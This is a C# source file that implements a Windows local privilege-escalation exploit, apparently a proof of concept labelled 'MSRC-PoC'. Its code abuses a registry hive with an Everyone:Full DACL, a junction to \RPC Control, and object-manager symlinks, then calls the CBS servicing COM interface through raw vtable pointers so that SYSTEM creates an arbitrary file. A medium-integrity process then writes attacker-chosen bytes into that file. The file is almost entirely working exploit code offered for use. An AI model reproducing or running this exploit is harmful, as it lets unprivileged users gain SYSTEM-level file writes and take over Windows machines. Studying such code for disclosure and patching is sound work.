using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using IOPath = System.IO.Path;

namespace TrustedHive;

public enum LineColor
{
    Bright,
    Dim,
    Green,
    Warning,
    Pink,
}

public record struct ConsoleLine(string Text, LineColor Color, int DelayMs = 140, int? Progress = null);

public static class GenerateOutput
{
    public static List<ConsoleLine> BuildScript(string inputFile, string outputPath)
    {
        var lines = new List<ConsoleLine>();
        lines.Add(new ConsoleLine($"input file ........... {inputFile}", LineColor.Bright, 80));
        lines.Add(new ConsoleLine($"output path .......... {outputPath}", LineColor.Bright, 80));
        lines.Add(new ConsoleLine("", LineColor.Dim, 40));
        return lines;
    }

    public delegate void EmitLine(ConsoleLine line);

    public static void RunExploit(string inputFilePath, string outputPath, EmitLine emit, CancellationToken ct)
    {
        void Info(string text, int delay = 140, int? progress = null)
        {
            ct.ThrowIfCancellationRequested();
            emit(new ConsoleLine(text, LineColor.Bright, delay, progress));
            Thread.Sleep(delay);
        }
        void Detail(string text, int delay = 100, int? progress = null)
        {
            ct.ThrowIfCancellationRequested();
            emit(new ConsoleLine(text, LineColor.Dim, delay, progress));
            Thread.Sleep(delay);
        }
        void Success(string text, int delay = 200, int? progress = null)
        {
            ct.ThrowIfCancellationRequested();
            emit(new ConsoleLine(text, LineColor.Green, delay, progress));
            Thread.Sleep(delay);
        }
        void Warn(string text, int delay = 200, int? progress = null)
        {
            ct.ThrowIfCancellationRequested();
            emit(new ConsoleLine(text, LineColor.Warning, delay, progress));
            Thread.Sleep(delay);
        }
        void Fail(string text)
        {
            emit(new ConsoleLine(text, LineColor.Warning, 0));
        }

        try
        {
            var inputFull = IOPath.GetFullPath(inputFilePath);
            var outputFull = IOPath.GetFullPath(outputPath);

            if (!File.Exists(inputFull))
            {
                Fail($"[-] input file not found: {inputFull}");
                return;
            }

            byte[] payload = File.ReadAllBytes(inputFull);
            Info($"payload read ......... {payload.Length:N0} bytes", 120, 5);

            // resolve ntdll!NtCreateSymbolicLinkObject
            var ntCreateSymLink = NtDll.GetNtCreateSymbolicLinkObject();
            if (ntCreateSymLink == null)
            {
                Fail("[-] cannot resolve ntdll!NtCreateSymbolicLinkObject");
                return;
            }
            Detail("  ntdll ................ NtCreateSymbolicLinkObject resolved", 80, 8);

            // working layout under %TEMP%
            var temp = IOPath.GetTempPath();
            var work = IOPath.Combine(temp, $"ti_eop_{Environment.ProcessId}");
            var img = IOPath.Combine(work, "img");
            var configDir = IOPath.Combine(img, "System32", "config");
            var hiveDir = IOPath.Combine(work, "hive");
            var hivePath = IOPath.Combine(hiveDir, "COMPONENTS");

            Directory.CreateDirectory(configDir);
            Directory.CreateDirectory(hiveDir);
            Detail($"  workdir .............. {work}", 80, 10);

            // [1] Build attacker reference-image hive
            Info("[1] building attacker reference-image hive (RegLoadAppKey, no privilege)", 160, 14);
            CreateReferenceHive(hivePath);
            Success("    hive created with permissive DACL (Everyone:Full)", 120, 20);

            // [2] Junction <img>\System32\config -> \RPC Control
            Info("[2] junction <img>\\System32\\config -> \\RPC Control (no privilege)", 160, 26);
            JunctionToRpcControl(configDir);
            Success("    junction set", 120, 32);

            // [3] Object-manager symlinks under \RPC Control
            Info("[3] object symlinks: COMPONENTS -> hive, COMPONENTS.LOG1 -> target", 160, 38);
            var ntHive = $@"\??\{hivePath}";
            var ntTarget = $@"\??\{outputFull}";
            var linkHive = NtDll.CreateObjectSymlink(ntCreateSymLink, @"\RPC Control\COMPONENTS", ntHive);
            var linkLog = NtDll.CreateObjectSymlink(ntCreateSymLink, @"\RPC Control\COMPONENTS.LOG1", ntTarget);
            if (linkHive == IntPtr.Zero || linkLog == IntPtr.Zero)
            {
                Fail("[-] NtCreateSymbolicLinkObject failed");
                Cleanup(linkHive, linkLog, configDir, work);
                return;
            }
            Detail($"    COMPONENTS      -> {hivePath}", 80);
            Detail($"    COMPONENTS.LOG1 -> {outputFull}", 80, 44);

            // [4] Activate CBS session and obtain ungated transformer executor
            Info("[4] activating CBS session (SYSTEM) and obtaining ungated transformer executor", 200, 50);
            IntPtr session = IntPtr.Zero, executor = IntPtr.Zero;
            try
            {
                int hr = CbsCom.CreateCbsSessionAndExecutor(img, out session, out executor);
                if (executor == IntPtr.Zero)
                {
                    Fail($"[-] CreateExternalTransformerExecutor hr=0x{hr:X8} (patched?)");
                    Cleanup(linkHive, linkLog, configDir, work);
                    return;
                }
                Detail($"    executor obtained (CBS session active)", 120, 58);

                // [5] Trigger the SYSTEM-side hive load / file creation
                Info("[5] executor.Initialize(ReferenceImage) -> SYSTEM creates target file", 200, 62);
                hr = CbsCom.InitializeExecutor(executor, img);
                Detail($"    executor returned 0x{hr:X8} (expected; load aborts after LOG1)", 140, 68);
            }
            finally
            {
                // [6] Tear down redirection
                if (executor != IntPtr.Zero) Marshal.Release(executor);
                if (session != IntPtr.Zero) Marshal.Release(session);
                NativeMethods.CloseHandle(linkHive);
                NativeMethods.CloseHandle(linkLog);
            }

            Thread.Sleep(500);

            if (!File.Exists(outputFull))
            {
                Fail("[-] FAILED: SYSTEM did not create the target (surface may be patched)");
                CleanupWorkdir(configDir, work);
                return;
            }
            Info($"[6] SYSTEM created: {outputFull}", 160, 74);

            // [7] Write caller-chosen bytes into the SYSTEM-created file
            Info("[7] writing payload into SYSTEM-created file (medium-IL user)", 160, 80);
            bool written = false;
            for (int attempt = 0; attempt < 40; attempt++)
            {
                try
                {
                    using var fs = new FileStream(outputFull, FileMode.Open, FileAccess.Write, FileShare.ReadWrite | FileShare.Delete);
                    fs.Seek(0, SeekOrigin.Begin);
                    fs.Write(payload, 0, payload.Length);
                    fs.SetLength(payload.Length);
                    written = true;
                    break;
                }
                catch (IOException)
                {
                    Thread.Sleep(250);
                }
            }
            if (!written)
            {
                Fail("[-] could not open target for write (still locked?)");
                CleanupWorkdir(configDir, work);
                return;
            }
            Success($"    {payload.Length:N0} bytes written", 120, 90);

            // [8] Clear Hidden/System attributes
            Info("[8] clearing Hidden/System attributes", 120, 94);
            try
            {
                var attrs = File.GetAttributes(outputFull);
                attrs &= ~(FileAttributes.Hidden | FileAttributes.System);
                if (attrs == 0) attrs = FileAttributes.Normal;
                File.SetAttributes(outputFull, attrs);
                Detail("    attributes normalised (ordinary visible file)", 100, 98);
            }
            catch
            {
                Warn("    could not clear attributes (non-critical)", 100, 98);
            }

            // Cleanup
            CleanupWorkdir(configDir, work);

            Detail("", 40);
            Success($"[+] SUCCESS -> {outputFull}", 200, 100);
            Success($"[+] {payload.Length:N0} bytes written as SYSTEM from medium-IL process", 140);
        }
        catch (OperationCanceledException)
        {
            Warn("[-] aborted by user");
        }
        catch (Exception ex)
        {
            Fail($"[-] unhandled error: {ex.Message}");
        }
    }

    static void Cleanup(IntPtr linkHive, IntPtr linkLog, string configDir, string work)
    {
        if (linkHive != IntPtr.Zero) NativeMethods.CloseHandle(linkHive);
        if (linkLog != IntPtr.Zero) NativeMethods.CloseHandle(linkLog);
        CleanupWorkdir(configDir, work);
    }

    static void CleanupWorkdir(string configDir, string work)
    {
        try
        {
            // Remove junction first so we don't recurse into \RPC Control
            if (Directory.Exists(configDir))
            {
                var di = new DirectoryInfo(configDir);
                di.Attributes = FileAttributes.Directory;
                Directory.Delete(configDir, false);
            }
        }
        catch { }
        try { Directory.Delete(work, true); } catch { }
    }

    // ================================================================
    // Registry hive creation with permissive DACL
    // ================================================================
    static void CreateReferenceHive(string hivePath)
    {
        if (File.Exists(hivePath)) File.Delete(hivePath);

        int result = NativeMethods.RegLoadAppKeyW(hivePath, out var hKey, 0xF003F /* KEY_ALL_ACCESS */, 0, 0);
        if (result != 0)
            throw new InvalidOperationException($"RegLoadAppKey failed: {result}");

        byte[] data = System.Text.Encoding.Unicode.GetBytes("TI-EoP\0");
        NativeMethods.RegSetValueExW(hKey, "poc", 0, 1 /* REG_SZ */, data, data.Length);
        NativeMethods.RegFlushKey(hKey);
        NativeMethods.RegCloseKey(hKey);

        // Set permissive DACL: Everyone + SYSTEM + Administrators = Full
        var sd = new FileSecurity();
        sd.SetAccessRuleProtection(true, false);
        sd.AddAccessRule(new FileSystemAccessRule(
            new SecurityIdentifier(WellKnownSidType.WorldSid, null),
            FileSystemRights.FullControl, AccessControlType.Allow));
        sd.AddAccessRule(new FileSystemAccessRule(
            new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
            FileSystemRights.FullControl, AccessControlType.Allow));
        sd.AddAccessRule(new FileSystemAccessRule(
            new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null),
            FileSystemRights.FullControl, AccessControlType.Allow));
        new FileInfo(hivePath).SetAccessControl(sd);
    }

    // ================================================================
    // Junction to \RPC Control
    // ================================================================
    static void JunctionToRpcControl(string directory)
    {
        const string target = @"\RPC Control";
        int targetBytes = target.Length * 2;
        int pathBufBytes = targetBytes + 2 + 2; // substitute + NUL + print NUL
        int headerSize = 8; // SubstituteNameOffset(2) + Length(2) + PrintNameOffset(2) + Length(2)
        int reparseDataLength = headerSize + pathBufBytes;
        int totalSize = 8 + reparseDataLength; // ReparseTag(4) + ReparseDataLength(2) + Reserved(2)

        var buffer = new byte[totalSize];
        // ReparseTag = IO_REPARSE_TAG_MOUNT_POINT (0xA0000003)
        BitConverter.GetBytes(0xA0000003u).CopyTo(buffer, 0);
        // ReparseDataLength
        BitConverter.GetBytes((ushort)reparseDataLength).CopyTo(buffer, 4);
        // Reserved = 0 (already zeroed)
        // SubstituteNameOffset = 0
        // SubstituteNameLength
        BitConverter.GetBytes((ushort)targetBytes).CopyTo(buffer, 10);
        // PrintNameOffset = targetBytes + 2
        BitConverter.GetBytes((ushort)(targetBytes + 2)).CopyTo(buffer, 12);
        // PrintNameLength = 0
        // PathBuffer: substitute name
        System.Text.Encoding.Unicode.GetBytes(target).CopyTo(buffer, 16);

        var handle = NativeMethods.CreateFileW(
            directory, 0x40000000 /* GENERIC_WRITE */,
            7 /* FILE_SHARE_READ | WRITE | DELETE */,
            IntPtr.Zero, 3 /* OPEN_EXISTING */,
            0x02000000 | 0x00200000 /* FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT */,
            IntPtr.Zero);

        if (handle == new IntPtr(-1))
            throw new InvalidOperationException($"Cannot open directory for junction: {Marshal.GetLastWin32Error()}");

        try
        {
            if (!NativeMethods.DeviceIoControl(handle, 0x000900A4 /* FSCTL_SET_REPARSE_POINT */,
                    buffer, buffer.Length, null, 0, out _, IntPtr.Zero))
                throw new InvalidOperationException($"FSCTL_SET_REPARSE_POINT failed: {Marshal.GetLastWin32Error()}");
        }
        finally
        {
            NativeMethods.CloseHandle(handle);
        }
    }
}

// ================================================================
// P/Invoke declarations
// ================================================================
internal static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice, uint dwIoControlCode,
        byte[] lpInBuffer, int nInBufferSize,
        byte[]? lpOutBuffer, int nOutBufferSize,
        out int lpBytesReturned, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int RegLoadAppKeyW(
        string lpFile, out IntPtr phkResult, uint samDesired, uint dwOptions, uint reserved);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int RegSetValueExW(
        IntPtr hKey, string? lpValueName, int reserved, int dwType, byte[] lpData, int cbData);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegFlushKey(IntPtr hKey);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegCloseKey(IntPtr hKey);
}

// ================================================================
// NT object-manager symlink creation
// ================================================================
internal static class NtDll
{
    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    const uint OBJ_CASE_INSENSITIVE = 0x00000040;
    const uint SYMBOLIC_LINK_ALL_ACCESS = 0xF0001;

    [DllImport("ntdll.dll")]
    static extern int NtCreateSymbolicLinkObject(
        out IntPtr LinkHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, ref UNICODE_STRING LinkTarget);

    delegate int NtCreateSymbolicLinkObjectDelegate(
        out IntPtr LinkHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, ref UNICODE_STRING LinkTarget);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr GetModuleHandleW(string lpModuleName);

    public static Func<string, string, IntPtr>? GetNtCreateSymbolicLinkObject()
    {
        var ntdll = GetModuleHandleW("ntdll.dll");
        var proc = GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
        if (proc == IntPtr.Zero) return null;
        return (linkName, targetPath) => CreateObjectSymlinkImpl(linkName, targetPath);
    }

    public static IntPtr CreateObjectSymlink(Func<string, string, IntPtr> _, string linkName, string targetNtPath)
    {
        return CreateObjectSymlinkImpl(linkName, targetNtPath);
    }

    static IntPtr CreateObjectSymlinkImpl(string linkName, string targetNtPath)
    {
        var nameStr = AllocUnicodeString(linkName);
        var targetStr = AllocUnicodeString(targetNtPath);

        var oa = new OBJECT_ATTRIBUTES
        {
            Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
            RootDirectory = IntPtr.Zero,
            ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf<UNICODE_STRING>()),
            Attributes = OBJ_CASE_INSENSITIVE,
            SecurityDescriptor = IntPtr.Zero,
            SecurityQualityOfService = IntPtr.Zero,
        };
        Marshal.StructureToPtr(nameStr, oa.ObjectName, false);

        int status = NtCreateSymbolicLinkObject(out var handle, SYMBOLIC_LINK_ALL_ACCESS, ref oa, ref targetStr);

        Marshal.FreeHGlobal(nameStr.Buffer);
        Marshal.FreeHGlobal(targetStr.Buffer);
        Marshal.FreeHGlobal(oa.ObjectName);

        return status == 0 ? handle : IntPtr.Zero;
    }

    static UNICODE_STRING AllocUnicodeString(string s)
    {
        var us = new UNICODE_STRING();
        us.Length = (ushort)(s.Length * 2);
        us.MaximumLength = (ushort)(us.Length + 2);
        us.Buffer = Marshal.StringToHGlobalUni(s);
        return us;
    }
}

// ================================================================
// CBS COM interop (raw vtable calls)
// ================================================================
internal static class CbsCom
{
    static readonly Guid CLSID_CbsSession = new("752073a1-23f2-4396-85f0-8fdb879ed0ed");
    static readonly Guid IID_ICbsSession10 = new("f112757a-565b-4260-bd05-9fa34417349a");
    static readonly Guid IID_IExecutor = new("1c8adb85-982e-47f9-999f-b0c3bf9d0449");

    [DllImport("ole32.dll")]
    static extern int CoCreateInstance(
        ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext,
        ref Guid riid, out IntPtr ppv);

    const uint CLSCTX_LOCAL_SERVER = 4;

    public static int CreateCbsSessionAndExecutor(string imgPath, out IntPtr session, out IntPtr executor)
    {
        session = IntPtr.Zero;
        executor = IntPtr.Zero;

        var clsid = CLSID_CbsSession;
        var iid = IID_ICbsSession10;
        int hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out session);
        if (hr < 0 || session == IntPtr.Zero) return hr;

        // Call Initialize (vtable slot 3): Initialize(session, 0, L"MSRC-PoC", NULL, NULL)
        var vtable = Marshal.ReadIntPtr(session);
        var initPtr = Marshal.ReadIntPtr(vtable, 3 * IntPtr.Size);
        var init = Marshal.GetDelegateForFunctionPointer<CbsInitialize>(initPtr);
        hr = init(session, 0, "MSRC-PoC", null, null);

        // Call CreateExternalTransformerExecutor (vtable slot 20)
        var createExecPtr = Marshal.ReadIntPtr(vtable, 20 * IntPtr.Size);
        var createExec = Marshal.GetDelegateForFunctionPointer<CbsCreateExecutor>(createExecPtr);
        hr = createExec(session, out var executorUnk);
        if (hr < 0 || executorUnk == IntPtr.Zero) return hr;

        // QI for ICSIExternalTransformerExecutor
        var execIid = IID_IExecutor;
        var qiPtr = Marshal.ReadIntPtr(Marshal.ReadIntPtr(executorUnk), 0);
        var qi = Marshal.GetDelegateForFunctionPointer<QueryInterfaceDelegate>(qiPtr);
        hr = qi(executorUnk, ref execIid, out executor);
        Marshal.Release(executorUnk);

        return hr;
    }

    public static int InitializeExecutor(IntPtr executor, string imgPath)
    {
        // Executor::Initialize(this, Flags=0, ReferenceVersion=0, ReferenceImage=img, NULL, NULL) — vtable slot 3
        var vtable = Marshal.ReadIntPtr(executor);
        var initPtr = Marshal.ReadIntPtr(vtable, 3 * IntPtr.Size);
        var init = Marshal.GetDelegateForFunctionPointer<ExecutorInitialize>(initPtr);
        return init(executor, 0, 0, imgPath, null, null);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    delegate int CbsInitialize(IntPtr self, int flags, string? clientId, string? a, string? b);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int CbsCreateExecutor(IntPtr self, out IntPtr executor);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int QueryInterfaceDelegate(IntPtr self, ref Guid riid, out IntPtr ppv);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    delegate int ExecutorInitialize(IntPtr self, int flags, int refVersion, string? refImage, string? fileStorage, string? regStorage);
}
